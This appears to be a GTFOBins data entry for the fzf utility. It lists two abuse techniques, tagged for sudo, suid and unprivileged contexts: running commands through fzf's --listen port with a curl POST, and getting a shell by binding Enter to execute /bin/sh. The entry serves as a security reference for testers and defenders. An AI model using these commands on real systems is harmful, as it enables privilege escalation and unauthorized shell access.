<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/fzf -->
---
functions:
  command:
  - code: |-
      fzf --listen=12345
    comment: |-
      Commands can be issued via POST requests, for example:

      ```
      curl http://localhost:12345 -d 'execute(/path/to/command)'
      ```
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  shell:
  - code: |-
      fzf --bind 'enter:execute(/bin/sh)'
    comment: |-
      Press `Enter` to receive the shell.
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
